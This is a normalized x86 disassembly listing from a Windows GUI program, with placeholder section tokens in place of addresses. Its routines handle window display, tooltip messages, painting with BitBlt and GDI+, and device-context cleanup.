sub_419880
push ebp
mov ebp esp
mov al [ ebp + 0x8 ]
mov [ ecx + 0x26 ] al
mov ecx [ ecx + 0x1b0 ]
movzx eax al
neg eax
sbb eax eax
and eax 0x5
push eax
push ecx
call [ ShowWindow@IAT ]
pop ebp
retn 0x4
sub_4198f0
push ebp
mov ebp esp
push 0xcc0020
push eax
mov eax [ ebp + 0x18 ]
push ecx
mov ecx [ ebp + 0x14 ]
push edx
mov edx [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push edx
mov edx [ ecx ]
push eax
push edx
call [ BitBlt@IAT ]
pop ebp
retn 0x14
sub_419920
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_419950
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
add esp 0x4
sub_419950
push ebp
mov ebp esp
push 0xffffffff
push sub_449131
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
mov [ ebp - 0x4 ] 0xffffffff
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
mov [ ebp - 0x4 ] 0xffffffff
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
mov [ ebp - 0x4 ] 0x3
lea ecx [ esi + 0x140 ]
call sub_427df0
mov [ ebp - 0x4 ] 0x2
lea ecx [ esi + 0x70 ]
call sub_412b40
mov [ ebp - 0x4 ] 0xffffffff
mov [ esi ] r--data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_419a00
mov eax [ ebx ]
push esi
push eax
call [ GetWindowTextLengthW@IAT ]
lea esi [ eax + 0x1 ]
test esi esi
jns r-xdata
mov eax [ edi ]
mov edx [ eax - 0x8 ]
mov ecx 0x1
sub ecx [ eax - 0x4 ]
sub edx esi
or ecx edx
jge r-xdata
push 0x80070057
call sub_402d00
mov eax [ edi ]
push esi
push eax
mov eax [ ebx ]
push eax
call [ GetWindowTextW@IAT ]
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov eax esi
mov ecx edi
call sub_402c40
test eax eax
js r-xdata
mov eax [ edi ]
mov ecx [ eax - 0x8 ]
test eax eax
je r-xdata
mov ecx [ edi ]
cmp eax [ ecx - 0x8 ]
jg r-xdata
push ecx
push eax
call [ wcsnlen@IAT ]
add esp 0x8
mov [ ecx - 0xc ] eax
mov ecx [ edi ]
xor edx edx
mov [ ecx + eax * 2 ] dx
mov eax esi
pop esi
retn
sub_419a80
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
add esp 0x4
sub_419ac0
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
cmp eax 0x84
jne r-xdata
mov ecx [ ebp + 0x14 ]
cmp eax 0x46
je r-xdata
or eax 0xffffffff
pop ebp
retn 0x10
and [ ecx + 0x18 ] 0xfffffffb
mov [ ecx + 0x4 ] 0xffffffff
cmp eax 0x47
jne r-xdata
mov edx [ ebp + 0x8 ]
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
push eax
mov eax [ rw-data ]
push edx
push eax
call [ CallWindowProcW@IAT ]
pop ebp
retn 0x10
sub_419b10
mov eax [ rw-data ]
mov ecx [ rw-data ]
mov edx [ rw-data ]
push edi
push 0x0
push eax
mov eax [ rw-data ]
push 0x0
push 0x0
sub ecx eax
push ecx
mov ecx [ rw-data ]
sub edx ecx
push edx
push eax
push ecx
push 0x80000003
push 0x0
push r--data
push 0x8
call [ CreateWindowExW@IAT ]
push 0xfffffffc
push eax
mov [ esi + 0x4 ] eax
call [ GetWindowLongW@IAT ]
cmp [ rw-data ] 0x0
jne r-xdata
cmp eax sub_419ac0
je r-xdata
mov [ rw-data ] eax
mov edx [ esi + 0x4 ]
mov edi [ SendMessageW@IAT ]
push 0x0
push 0x1
push 0x401
push edx
call edi
mov eax [ esi + 0x4 ]
push 0xffffffff
push 0x0
push 0x418
push eax
call edi
pop edi
retn
mov ecx [ esi + 0x4 ]
push sub_419ac0
push 0xfffffffc
push ecx
call [ SetWindowLongW@IAT ]
sub_419bb0
push ebp
mov ebp esp
mov eax [ esi + 0x4 ]
sub esp 0x1c
test eax eax
je r-xdata
mov esp ebp
pop ebp
retn 0xc
push eax
call [ IsWindow@IAT ]
test eax eax
je r-xdata
push edi
mov edi [ SendMessageW@IAT ]
cmp ebx 0x2a3
jne r-xdata
cmp ebx 0x200
jne r-xdata
mov eax [ esi + 0x4 ]
push 0x0
push 0x0
push 0x401
push eax
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov [ ebp - 0x1c ] edx
lea edx [ ebp - 0x1c ]
push edx
push 0x0
mov [ ebp - 0x14 ] eax
mov eax [ esi + 0x4 ]
push 0x407
push eax
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x10 ] ecx
call edi
pop edi
mov ecx [ esi + 0x4 ]
push 0x0
push 0x1
push 0x401
push ecx
call edi
sub_419c30
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_447ea8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x58
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x50 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x68 ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov esi ecx
cmp [ esi + 0x64 ] 0x0
mov [ esp + 0x18 ] eax
jne r-xdata
mov ecx [ esp + 0x68 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x50 ]
xor ecx esp
call sub_443fba
mov esp ebp
pop ebp
retn 0x8
mov eax [ esi + 0x18 ]
mov ebx [ esi + 0x4 ]
test eax eax
je r-xdata
mov [ esp + 0x1c ] 0x0
mov ecx [ eax + 0x8 ]
mov [ esp + 0x1c ] ecx
jmp r-xdata
mov eax [ ebx + 0x68 ]
sub eax 0x10
call sub_4025f0
add eax 0x10
mov [ esp + 0x14 ] eax
mov [ esp + 0x70 ] 0x1
mov edx [ rw-data ]
mov ecx [ edx + 0x44 ]
mov edx [ esp + 0x1c ]
mov eax [ ecx ]
mov eax [ eax + 0x10 ]
push edx
push edi
push esi
lea edx [ esp + 0x20 ]
push edx
call eax
mov eax [ esp + 0x14 ]
cmp [ eax - 0xc ] 0x0
je r-xdata
push 0x0
push rw-data
push rw-data
push 0x0
push esi
call __RTDynamicCast
add esp 0x14
test eax eax
je r-xdata
cmp [ esi + 0x10 ] 0x9
mov edi [ ebx + 0x60 ]
jne r-xdata
mov [ esp + 0x70 ] 0xffffffff
mov eax [ esp + 0x14 ]
add eax 0xfffffff0
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov edi [ esi + 0x8 ]
push esi
lea ecx [ esp + 0x24 ]
push ecx
mov ecx [ esp + 0x20 ]
mov ebx eax
call sub_41a0c0
mov edx [ ebp + 0xc ]
push ebx
push edx
lea ebx [ esp + 0x28 ]
mov eax edi
lea esi [ esp + 0x38 ]
call sub_41a300
mov ecx [ esp + 0x18 ]
mov edx [ ecx + 0x4 ]
mov eax esi
push eax
push 0x0
push 0x432
push edx
call [ SendMessageW@IAT ]
cmp [ eax + 0x74 ] 0x0
je r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
mov edi [ ebx + 0x64 ]
sub_419d90
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x48
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x44 ] eax
mov eax [ ebp + 0xc ]
push ebx
push esi
mov esi [ eax + 0x8 ]
push eax
lea eax [ esp + 0x10 ]
push eax
mov ecx edi
call sub_41a0c0
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0x8 ]
push ecx
mov eax esi
push edx
lea ebx [ esp + 0x14 ]
lea esi [ esp + 0x24 ]
call sub_41a300
mov ecx [ edi + 0x4 ]
mov eax esi
push eax
push 0x0
push 0x432
push ecx
call [ SendMessageW@IAT ]
mov ecx [ esp + 0x4c ]
pop esi
pop ebx
xor ecx esp
call sub_443fba
mov esp ebp
pop ebp
retn 0xc
sub_419e00
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
mov esi [ edi + 0x4 ]
mov ecx [ esi + 0x6c ]
cmp [ ecx - 0xc ] 0x0
mov ebx [ ecx - 0x10 ]
lea eax [ ecx - 0x10 ]
je r-xdata
mov ebx [ ebp + 0x8 ]
add ebx 0x4
cmp [ ebx ] 0x0
je r-xdata
cmp [ eax + 0xc ] 0x0
lea edx [ eax + 0xc ]
jge r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
mov edi [ edi + 0x8 ]
mov esi [ ebp + 0xc ]
call sub_41a270
or ecx 0xffffffff
[ edx ] ecx
dec ecx
test ecx ecx
jg r-xdata
cmp [ ecx - 0x8 ] 0x0
jge r-xdata
mov edx [ ebx ]
mov eax [ edx + 0xc ]
mov ecx ebx
call eax
add eax 0x10
mov [ esi + 0x6c ] eax
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
mov [ ecx - 0xc ] 0x0
mov eax [ esi + 0x6c ]
xor ecx ecx
mov [ eax ] cx
jmp r-xdata
push 0x80070057
call sub_402d00
sub_419e90
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
mov esi eax
mov eax [ esi + 0x4 ]
mov edx [ eax + 0x6c ]
cmp [ edx - 0xc ] 0x0
push edi
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ ecx + 0x4 ] 0x0
lea ebx [ ecx + 0x4 ]
je r-xdata
push esi
lea eax [ ebp - 0x14 ]
push eax
call sub_41a0c0
mov edi [ esi + 0x8 ]
mov esi [ ebp + 0x8 ]
push eax
call sub_41a1d0
sub_419ed0
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_4490d8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x50
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x48 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x60 ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x4 ] 0x0
mov [ esp + 0x24 ] eax
mov [ esp + 0x18 ] ecx
mov esi edx
je r-xdata
mov ecx [ esp + 0x60 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x48 ]
xor ecx esp
call sub_443fba
mov esp ebp
pop ebp
retn 0x4
mov ebx [ esi + 0x4 ]
mov eax [ ebx + 0x68 ]
mov edi [ esi + 0x18 ]
sub eax 0x10
mov [ esp + 0x20 ] ebx
call sub_4025f0
add eax 0x10
mov [ esp + 0x14 ] eax
mov [ esp + 0x68 ] 0x1
test edi edi
je r-xdata
mov [ esp + 0x1c ] 0x0
mov edx [ edi + 0x8 ]
mov [ esp + 0x1c ] edx
jmp r-xdata
mov edx [ edi ]
mov eax [ edx + 0x58 ]
mov ecx edi
call eax
test eax eax
je r-xdata
push 0x0
push rw-data
push rw-data
push 0x0
push esi
call __RTDynamicCast
add esp 0x14
test eax eax
je r-xdata
cmp [ esi + 0x10 ] 0x9
mov ebx [ ebx + 0x60 ]
jne r-xdata
mov eax [ rw-data ]
mov ecx [ eax + 0x44 ]
mov eax [ esp + 0x1c ]
mov edx [ ecx ]
mov edx [ edx + 0x10 ]
push eax
push ebx
push esi
lea eax [ esp + 0x20 ]
push eax
call edx
mov ecx [ esp + 0x1c ]
mov edx [ eax ]
mov edx [ edx + 0x48 ]
push ecx
push ebx
push esi
lea ecx [ esp + 0x20 ]
push ecx
mov ecx eax
call edx
test eax eax
jne r-xdata
cmp [ eax + 0x74 ] 0x0
je r-xdata
mov [ esp + 0x68 ] 0xffffffff
mov eax [ esp + 0x14 ]
add eax 0xfffffff0
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov edi [ esp + 0x20 ]
mov ecx [ edi + 0x6c ]
add edi 0x6c
xor ebx ebx
cmp [ ecx - 0xc ] ebx
jne r-xdata
mov eax [ esp + 0x14 ]
cmp [ eax - 0xc ] 0x0
je r-xdata
mov eax [ esp + 0x20 ]
mov ebx [ eax + 0x64 ]
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
mov esi [ esi + 0x8 ]
push 0x30
lea ecx [ esp + 0x2c ]
push ebx
push ecx
mov edi eax
call memset
add esp 0xc
mov [ esp + 0x28 ] 0x30
mov [ esp + 0x2c ] ebx
cmp esi ebx
jne r-xdata
lea eax [ esp + 0x14 ]
call sub_401760
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x18 ]
mov edi [ esp + 0x24 ]
push edx
push esi
push eax
call sub_419d90
jmp r-xdata
mov edx [ esp + 0x18 ]
mov [ esp + 0x30 ] edx
mov esi [ esp + 0x18 ]
push esi
call [ GetParent@IAT ]
or [ esp + 0x2c ] 0x1
mov [ esp + 0x30 ] eax
jmp r-xdata
mov eax [ rw-data ]
mov edx [ esp + 0x24 ]
lea ecx [ esp + 0x28 ]
push ecx
push ebx
mov [ esp + 0x50 ] eax
mov eax [ edx + 0x4 ]
push 0x439
push eax
mov [ esp + 0x44 ] esi
mov [ esp + 0x5c ] edi
mov [ esp + 0x60 ] ebx
call [ SendMessageW@IAT ]
sub_41a0c0
push ebp
mov ebp esp
sub esp 0x3c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push ebx
mov [ ebp - 0x38 ] ecx
push esi
mov esi [ ebp + 0x8 ]
xor ecx ecx
push edi
cmp [ eax + 0x64 ] ecx
je r-xdata
mov edi [ eax + 0x3c ]
mov ecx [ eax + 0x30 ]
mov edx [ eax + 0x34 ]
mov ebx [ eax + 0x38 ]
mov [ ebp - 0x8 ] edi
mov edi [ eax + 0x18 ]
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] ebx
test edi edi
jne r-xdata
mov edx [ eax + 0x60 ]
mov [ ebp - 0x24 ] ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x18 ] ecx
lea ecx [ ebp - 0x24 ]
push ecx
push edx
call [ GetClientRect@IAT ]
mov eax [ ebp - 0x24 ]
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0x1c ]
mov [ esi ] eax
mov eax [ ebp - 0x18 ]
mov [ esi + 0x4 ] ecx
mov [ esi + 0x8 ] edx
mov [ esi + 0xc ] eax
jmp r-xdata
push 0x0
push rw-data
push rw-data
push 0x0
push edi
call __RTDynamicCast
add esp 0x14
test eax eax
je r-xdata
mov [ esi ] ecx
mov [ esi + 0x4 ] edx
mov [ esi + 0x8 ] ebx
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
mov eax esi
pop esi
xor ecx ebp
pop ebx
call sub_443fba
mov esp ebp
pop ebp
retn 0x8
mov ecx [ ebp - 0x38 ]
push edi
lea eax [ ebp - 0x34 ]
push eax
call sub_41a0c0
mov ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x34 ]
push ecx
push edx
lea eax [ ebp - 0x14 ]
push eax
call [ OffsetRect@IAT ]
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
mov [ esi ] ecx
mov [ esi + 0x4 ] edx
mov [ esi + 0x8 ] eax
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0xc ]
mov [ esi ] edx
mov edx [ ebp - 0x8 ]
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] ecx
mov [ esi + 0xc ] edx
jmp r-xdata
mov ecx [ ebp - 0x8 ]
mov [ esi + 0xc ] ecx
sub_41a1d0
push ebp
mov ebp esp
sub esp 0x3c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
push 0x30
lea eax [ ebp - 0x38 ]
push 0x0
push eax
call memset
xor ecx ecx
add esp 0xc
mov [ ebp - 0x38 ] 0x30
mov [ ebp - 0x34 ] ecx
cmp edi ecx
jne r-xdata
mov [ ebp - 0x30 ] esi
mov [ ebp - 0x2c ] edi
push esi
call [ GetParent@IAT ]
or [ ebp - 0x34 ] 0x1
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x2c ] esi
xor ecx ecx
jmp r-xdata
mov edx [ rw-data ]
lea eax [ ebp - 0x38 ]
push eax
push ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x10 ] ecx
mov ecx [ ebx ]
push 0x434
push ecx
mov [ ebp - 0x18 ] edx
call [ SendMessageW@IAT ]
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_443fba
mov esp ebp
pop ebp
retn 0x4
mov edx [ eax ]
mov [ ebp - 0x28 ] edx
mov edx [ eax + 0x4 ]
mov [ ebp - 0x24 ] edx
mov edx [ eax + 0x8 ]
mov eax [ eax + 0xc ]
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0x8 ]
cmp eax ecx
je r-xdata
sub_41a270
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x38
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x34 ] eax
push 0x30
lea eax [ esp + 0x8 ]
push 0x0
push eax
call memset
xor eax eax
add esp 0xc
mov [ esp + 0x4 ] 0x30
mov [ esp + 0x8 ] eax
cmp edi eax
jne r-xdata
mov [ esp + 0xc ] esi
mov [ esp + 0x10 ] edi
push esi
call [ GetParent@IAT ]
or [ esp + 0x8 ] 0x1
mov [ esp + 0xc ] eax
mov [ esp + 0x10 ] esi
xor eax eax
jmp r-xdata
mov ecx [ rw-data ]
lea edx [ esp + 0x4 ]
push edx
push eax
mov [ esp + 0x30 ] eax
mov [ esp + 0x34 ] eax
mov eax [ ebx ]
push 0x433
push eax
mov [ esp + 0x34 ] ecx
call [ SendMessageW@IAT ]
mov ecx [ esp + 0x34 ]
xor ecx esp
call sub_443fba
mov esp ebp
pop ebp
retn
sub_41a300
push ebp
mov ebp esp
push edi
push 0x30
push 0x0
push esi
mov edi eax
call memset
add esp 0xc
mov [ esi ] 0x30
mov [ esi + 0x4 ] 0x0
test edi edi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edi [ ebp + 0x8 ]
push edi
call [ GetParent@IAT ]
or [ esi + 0x4 ] 0x1
jmp r-xdata
mov edx [ rw-data ]
mov eax [ ebp + 0xc ]
mov [ esi + 0x20 ] edx
mov [ esi + 0x24 ] eax
mov [ esi + 0x28 ] 0x0
pop ebp
retn 0x8
mov ecx [ ebx ]
mov [ esi + 0x10 ] ecx
mov edx [ ebx + 0x4 ]
mov [ esi + 0x14 ] edx
mov eax [ ebx + 0x8 ]
mov [ esi + 0x18 ] eax
mov ecx [ ebx + 0xc ]
mov [ esi + 0x1c ] ecx
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] eax
pop edi
test ebx ebx
je r-xdata
sub_41a380
push ebp
mov ebp esp
push 0xffffffff
push sub_447e74
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
xor edi edi
mov [ esi ] r--data
mov [ esi + 0xc ] edi
mov [ ebp - 0x4 ] edi
mov [ esi + 0x10 ] edi
mov [ ebp - 0x4 ] 0x1
mov [ esi + 0x14 ] edi
mov [ ebp - 0x4 ] 0x2
mov [ esi + 0x20 ] edi
mov [ esi + 0x24 ] edi
mov [ esi + 0x28 ] edi
mov [ esi + 0x2c ] edi
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
lea ebx [ esi + 0x48 ]
mov ecx rw-data
mov [ ebp - 0x10 ] ebx
call edx
add eax 0x10
mov [ ebx ] eax
mov [ ebp - 0x4 ] 0x4
or eax 0xffffffff
mov [ esi + 0x4 ] 0x1
mov [ esi + 0x8 ] edi
mov [ esi + 0x18 ] edi
mov [ esi + 0x1c ] edi
mov [ esi + 0x40 ] eax
mov [ esi + 0x30 ] edi
mov [ esi + 0x34 ] edi
mov [ esi + 0x38 ] edi
mov [ esi + 0x3c ] edi
mov [ esi + 0x4c ] edi
mov [ ebp - 0x4 ] eax
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_41a430
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_41a460
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
add esp 0x4
sub_41a460
push ebp
mov ebp esp
push 0xffffffff
push sub_446194
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov ecx 0x2
mov [ ebp - 0x4 ] ecx
lea eax [ esi + 0x48 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] cl
mov eax [ eax ]
sub eax 0x10
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov [ ebp - 0x4 ] 0x1
mov eax [ esi + 0x14 ]
mov edi [ DeleteDC@IAT ]
xor ebx ebx
cmp eax ebx
je r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
mov [ ebp - 0x4 ] bl
mov eax [ esi + 0x10 ]
cmp eax ebx
je r-xdata
push eax
mov [ esi + 0x14 ] ebx
call edi
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ esi + 0xc ]
cmp eax ebx
je r-xdata
push eax
mov [ esi + 0x10 ] ebx
call edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push eax
mov [ esi + 0xc ] ebx
call edi
sub_41a520
push ebx
xor ebx ebx
cmp [ esi + 0x4 ] ebx
je r-xdata
pop ebx
retn
mov eax [ esi + 0xc ]
push edi
mov edi [ DeleteDC@IAT ]
cmp eax ebx
je r-xdata
mov eax [ esi + 0x10 ]
cmp eax ebx
je r-xdata
push eax
call edi
test eax eax
je r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
je r-xdata
push eax
call edi
test eax eax
je r-xdata
mov [ esi + 0xc ] ebx
mov edi [ esi + 0x30 ]
cmp edi ebx
je r-xdata
push eax
call edi
test eax eax
je r-xdata
mov [ esi + 0x10 ] ebx
mov edi [ esi + 0x34 ]
cmp edi ebx
je r-xdata
mov eax [ edi ]
push eax
call [ GdipDeleteGraphics@IAT ]
push edi
call [ GdipFree@IAT ]
mov [ esi + 0x30 ] ebx
mov [ esi + 0x14 ] ebx
mov edi [ esi + 0x18 ]
cmp edi ebx
je r-xdata
mov ecx [ edi ]
push ecx
call [ GdipDeleteGraphics@IAT ]
push edi
call [ GdipFree@IAT ]
mov [ esi + 0x34 ] ebx
mov edi [ esi + 0x1c ]
cmp edi ebx
je r-xdata
mov eax [ edi ]
cmp eax ebx
je r-xdata
mov ecx [ esi + 0x38 ]
pop edi
cmp ecx ebx
je r-xdata
mov eax [ edi ]
cmp eax ebx
je r-xdata
push edi
call [ operator delete@IAT ]
add esp 0x4
mov [ esi + 0x18 ] ebx
push eax
call [ DeleteObject@IAT ]
test eax eax
je r-xdata
mov ecx [ esi + 0x3c ]
cmp ecx ebx
je r-xdata
mov edx [ ecx ]
mov eax [ edx ]
push 0x1
call eax
mov [ esi + 0x38 ] ebx
push edi
call [ operator delete@IAT ]
add esp 0x4
mov [ esi + 0x1c ] ebx
push eax
call [ DeleteObject@IAT ]
test eax eax
je r-xdata
mov [ edi ] ebx
mov edx [ ecx ]
mov eax [ edx ]
push 0x1
call eax
mov [ esi + 0x3c ] ebx
mov [ edi ] ebx
sub_41a610
push ebp
mov ebp esp
push ebx
push esi
mov esi eax
push edi
lea ebx [ esi + 0x48 ]
test edx edx
jne r-xdata
mov eax edx
lea edi [ eax + 0x2 ]
jmp r-xdata
xor eax eax
jmp r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
push edx
push ebx
mov ebx eax
call sub_402910
cmp [ esi + 0x4 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ esi + 0x8 ] eax
jne r-xdata
sub eax edi
sar eax 0x1
push eax
call [ GetDC@IAT ]
mov edi eax
test edi edi
je r-xdata
pop edi
pop esi
mov al 0x1
pop ebx
pop ebp
retn 0x4
mov edx [ esi + 0x8 ]
lea ecx [ esi + 0x20 ]
push ecx
push edx
call [ GetClientRect@IAT ]
push 0x1
call sub_41a930
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov ebx [ CreateCompatibleDC@IAT ]
push edi
call ebx
push edi
mov [ esi + 0xc ] eax
call ebx
push edi
mov [ esi + 0x10 ] eax
call ebx
mov [ esi + 0x14 ] eax
mov eax [ esi + 0x8 ]
push edi
push eax
call [ ReleaseDC@IAT ]
sub_41a6b0
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_44521d
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc0
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0xb8 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0xd0 ]
mov [ fs : 0x0 ] eax
mov esi ecx
xor ebx ebx
cmp [ esi + 0x4 ] ebx
jne r-xdata
cmp [ esi + 0x4c ] ebx
je r-xdata
mov esi [ esi + 0x8 ]
mov [ esp + 0x24 ] ebx
mov [ esp + 0xd8 ] ebx
lea eax [ esp + 0x2c ]
push eax
push esi
mov [ esp + 0x30 ] esi
call [ BeginPaint@IAT ]
mov [ esp + 0x24 ] eax
mov [ esp + 0xd8 ] 0x1
lea ecx [ esp + 0x34 ]
push ecx
lea edx [ esp + 0xbc ]
push edx
call [ CopyRect@IAT ]
mov eax [ ebp + 0x8 ]
mov ecx [ esp + 0x24 ]
mov edi [ SetBkColor@IAT ]
push eax
push ecx
call edi
mov esi eax
cmp esi 0xffffffff
je r-xdata
mov ecx [ esp + 0xd0 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0xb8 ]
xor ecx esp
call sub_443fba
mov esp ebp
pop ebp
retn 0x4
mov eax [ esi + 0x8 ]
mov [ esp + 0x6c ] ebx
mov [ esp + 0xd8 ] 0x3
lea ecx [ esp + 0x74 ]
push ecx
push eax
mov [ esp + 0x78 ] eax
call [ BeginPaint@IAT ]
mov [ esp + 0x6c ] eax
mov [ esp + 0xd8 ] 0x4
lea edx [ esp + 0x7c ]
push edx
lea eax [ esp + 0x18 ]
push eax
call [ CopyRect@IAT ]
mov edx [ esp + 0x18 ]
mov edi [ esp + 0x14 ]
mov esi [ esi + 0xc ]
mov eax [ esp + 0x20 ]
mov ecx [ esp + 0x1c ]
push 0xcc0020
push edx
push edi
push esi
sub eax edx
push eax
sub ecx edi
push ecx
mov ecx [ esp + 0x84 ]
push edx
push edi
push ecx
call [ BitBlt@IAT ]
mov [ esp + 0xd8 ] 0x5
mov eax [ esp + 0x70 ]
lea edx [ esp + 0x74 ]
push edx
push eax
call [ EndPaint@IAT ]
mov [ esp + 0x6c ] ebx
mov [ esp + 0xd8 ] 0xffffffff
mov eax [ esp + 0x6c ]
cmp eax ebx
je r-xdata
mov [ esp + 0xd8 ] 0x2
mov eax [ esp + 0x28 ]
lea edx [ esp + 0x2c ]
push edx
push eax
call [ EndPaint@IAT ]
mov [ esp + 0x24 ] ebx
mov [ esp + 0xd8 ] 0xffffffff
mov eax [ esp + 0x24 ]
cmp eax ebx
je r-xdata
mov eax [ esp + 0x24 ]
push ebx
push ebx
push ebx
lea edx [ esp + 0xc4 ]
push edx
push 0x2
push ebx
push ebx
push eax
call [ ExtTextOutW@IAT ]
mov ecx [ esp + 0x24 ]
push esi
push ecx
call edi
mov [ esp + 0x6c ] ebx
mov [ esp + 0x24 ] ebx
jmp r-xdata
push eax
call [ DeleteDC@IAT ]
sub_41a8a0
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi ecx
xor eax eax
cmp [ esi + 0x4 ] eax
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_443fba
mov esp ebp
pop ebp
retn 0xc
push ebx
mov ebx [ ebp + 0x8 ]
push edi
lea edi [ esi + 0x20 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
push edi
lea ecx [ ebp - 0x14 ]
push ecx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] eax
call [ EqualRect@IAT ]
